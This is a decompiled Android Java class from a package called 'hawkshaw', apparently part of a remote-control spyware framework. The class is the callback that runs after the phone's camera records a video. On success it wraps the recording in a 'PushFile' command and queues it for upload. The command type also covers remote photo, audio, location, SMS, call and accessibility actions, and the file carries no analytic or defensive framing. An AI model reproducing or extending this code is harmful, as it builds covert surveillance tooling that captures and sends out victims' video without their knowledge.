package com.hawkshaw.library.features.media.camera;

import A.d;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import android.net.Uri;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import j3.f;
import java.io.File;
import java.util.concurrent.ExecutorService;
import o.v0;
import o.x0;
import s.C0938g;
import t3.N;

public final class RecordVideoKt$recordVideo$callback$1 implements v0 {
    final /* synthetic */ ExecutorService $cameraExecutor;
    final /* synthetic */ d $cameraProvider;
    final /* synthetic */ File $outputFile;

    public RecordVideoKt$recordVideo$callback$1(File file, ExecutorService executorService, d dVar) {
        this.$outputFile = file;
        this.$cameraExecutor = executorService;
        this.$cameraProvider = dVar;
    }

    public void onError(int i5, String str, Throwable th) {
        K.n(str, "message");
        RecordVideoKt.recordVideo$releaseResources(this.$cameraExecutor, this.$cameraProvider);
        Logger logger = Logger.INSTANCE;
        Logger.e$default(logger, "CameraXVideo", "RecordVideo failed, " + i5 + ", " + str, (Exception) null, false, 12, (Object) null);
    }

    public void onVideoSaved(x0 x0Var) {
        x0 x0Var2 = x0Var;
        K.n(x0Var2, "outputFileResults");
        Logger logger = Logger.INSTANCE;
        StringBuilder sb = new StringBuilder("Record Video, success Uri: ");
        Uri uri = x0Var2.f8135a;
        sb.append(uri);
        Logger.d$default(logger, "CameraXVideo", sb.toString(), false, 4, (Object) null);
        RecordVideoKt.recordVideo$releaseResources(this.$cameraExecutor, this.$cameraProvider);
        if (uri == null) {
            uri = Uri.fromFile(this.$outputFile);
        }
        Command.FileRequest fileRequest = r2;
        K.k(uri);
        String path = C0938g.t(uri).getPath();
        K.m(path, "getPath(...)");
        Command.FileRequest fileRequest2 = new Command.FileRequest(path, Command.FileRequest.Source.VideoRecording, (Command.FileRequest.Medium) null, 0, false, 28, (f) null);
        CoroutineKt.safeLaunch$default(J.a(N.f9290a), (j) null, new e(new Command(Command.CommandType.PushFile, 0, (Command.ThumbnailRequest) null, fileRequest, (Command.FilesRequest) null, (Command.DeletePendingPushFilesRequest) null, (Command.DeleteFileRequest) null, (Command.AddCallLogRequest) null, (Command.DeleteCallLogRequest) null, (Command.AddContactRequest) null, (Command.DeleteContactRequest) null, (Command.SendMessageRequest) null, (Command.GetLocationRequest) null, (Command.VibrateRequest) null, (Command.FlashRequest) null, (Command.TakePictureRequest) null, (Command.RecordVideoRequest) null, (Command.RecordAudioRequest) null, (Command.PushDeviceInfoRequest) null, (Command.OpenAppRequest) null, (Command.MakeCallRequest) null, (Command.DeviceAudioRequest) null, (Command.OpenDeeplinkRequest) null, (Command.LoginRequest) null, (Command.ScheduleCommandRequest) null, (Command.CancelScheduledCommandRequest) null, (Command.AccessibilityCommandRequest) null, (Command.StartRepeatPushDataRequest) null, (Command.SetDynamicConfigRequest) null, (Command.SyncAppConfigRequest) null, 1073741812, (f) null), (e) null), 1, (Object) null);
    }
}
